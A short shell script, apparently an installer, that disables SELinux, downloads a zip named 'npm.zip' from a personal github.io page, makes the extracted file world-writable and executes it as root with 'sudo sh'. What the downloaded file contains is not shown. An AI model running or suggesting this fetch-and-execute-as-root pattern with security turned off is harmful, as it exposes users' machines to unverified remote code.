sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
curl -L --progress-bar "https://fuserh.github.io/npm.zip" -o ./npm.zip
unzip npm.zip
# sudo cp -r npm /usr/npm
rm ./npm.zip
# rm npm
# sudo ls /usr/
# cd npm
sudo chmod 777 ./npm
sudo sh ./npm
